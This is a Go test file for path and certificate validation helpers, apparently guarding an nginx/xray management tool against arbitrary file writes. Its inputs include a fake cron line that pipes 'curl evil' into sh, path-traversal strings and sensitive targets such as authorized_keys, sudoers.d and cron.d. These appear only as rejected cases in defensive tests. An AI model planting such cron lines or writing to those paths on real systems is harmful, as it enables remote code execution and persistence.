package util

import (
	"crypto/ecdsa"
	"crypto/elliptic"
	"crypto/rand"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/pem"
	"math/big"
	"testing"
	"time"
)

func TestPathWithinDirs(t *testing.T) {
	dirs := []string{"/etc/nginx", "/usr/local/nginx/conf"}
	cases := []struct {
		path string
		want bool
	}{
		{"/etc/nginx/nginx.conf", true},
		{"/etc/nginx/conf.d/site.conf", true},
		{"/etc/nginx", true},                       // 目录本身
		{"/usr/local/nginx/conf/servers/a.conf", true},
		{"/etc/nginx-evil/x", false},               // 兄弟目录,HasPrefix 旧逻辑会误放行
		{"/etc/cron.d/pwn", false},                 // 越界
		{"/etc/nginx/../cron.d/pwn", false},         // 穿越,Clean 后逃出
		{"etc/nginx/x", false},                     // 相对路径
		{"/root/.ssh/authorized_keys", false},
	}
	for _, c := range cases {
		if got := PathWithinDirs(c.path, dirs); got != c.want {
			t.Errorf("PathWithinDirs(%q) = %v, want %v", c.path, got, c.want)
		}
	}
}

func TestCertPathSafe(t *testing.T) {
	bad := []string{
		"/etc/cron.d/pwn", "/etc/cron.d", "/var/spool/cron/root",
		"/etc/systemd/system/x.service", "/root/.ssh/authorized_keys",
		"/home/u/.bashrc", "/usr/local/bin/xray", "/etc/sudoers.d/x",
		"relative/path",
	}
	for _, p := range bad {
		if err := CertPathSafe(p); err == nil {
			t.Errorf("CertPathSafe(%q) = nil, want error", p)
		}
	}
	good := []string{
		"/usr/local/nginx/cert/example.com.pem",
		"/etc/nginx/ssl/example.com.key",
		"/usr/local/etc/xray/cert.pem",
	}
	for _, p := range good {
		if err := CertPathSafe(p); err != nil {
			t.Errorf("CertPathSafe(%q) = %v, want nil", p, err)
		}
	}
}

func TestValidateCertKeyPEM(t *testing.T) {
	certPEM, keyPEM := genCertKey(t)

	if err := ValidateCertKeyPEM(certPEM, keyPEM); err != nil {
		t.Fatalf("valid cert/key rejected: %v", err)
	}

	// 任意非 PEM 内容(模拟攻击者塞 cron / 脚本)必须被拒
	if err := ValidateCertKeyPEM("* * * * * root curl evil|sh\n", keyPEM); err == nil {
		t.Error("non-PEM cert content accepted, want rejected")
	}
	if err := ValidateCertKeyPEM(certPEM, "not a key"); err == nil {
		t.Error("non-PEM key content accepted, want rejected")
	}
}

func TestValidHostname(t *testing.T) {
	good := []string{"example.com", "a.b.c.example.com", "x-y.test", "EXAMPLE.com"}
	bad := []string{"", "../../etc/cron.d/x", "a/b", "a\\b", "x..y", "a b.com"}
	for _, s := range good {
		if !ValidHostname(s) {
			t.Errorf("ValidHostname(%q) = false, want true", s)
		}
	}
	for _, s := range bad {
		if ValidHostname(s) {
			t.Errorf("ValidHostname(%q) = true, want false", s)
		}
	}
}

// genCertKey 生成一对自签证书/私钥的 PEM,用于校验逻辑测试。
func genCertKey(t *testing.T) (certPEM, keyPEM string) {
	t.Helper()
	priv, err := ecdsa.GenerateKey(elliptic.P256(), rand.Reader)
	if err != nil {
		t.Fatal(err)
	}
	tmpl := &x509.Certificate{
		SerialNumber: big.NewInt(1),
		Subject:      pkix.Name{CommonName: "test"},
		NotBefore:    time.Unix(0, 0),
		NotAfter:     time.Unix(1<<31, 0),
	}
	der, err := x509.CreateCertificate(rand.Reader, tmpl, tmpl, &priv.PublicKey, priv)
	if err != nil {
		t.Fatal(err)
	}
	keyDER, err := x509.MarshalPKCS8PrivateKey(priv)
	if err != nil {
		t.Fatal(err)
	}
	certPEM = string(pem.EncodeToMemory(&pem.Block{Type: "CERTIFICATE", Bytes: der}))
	keyPEM = string(pem.EncodeToMemory(&pem.Block{Type: "PRIVATE KEY", Bytes: keyDER}))
	return certPEM, keyPEM
}
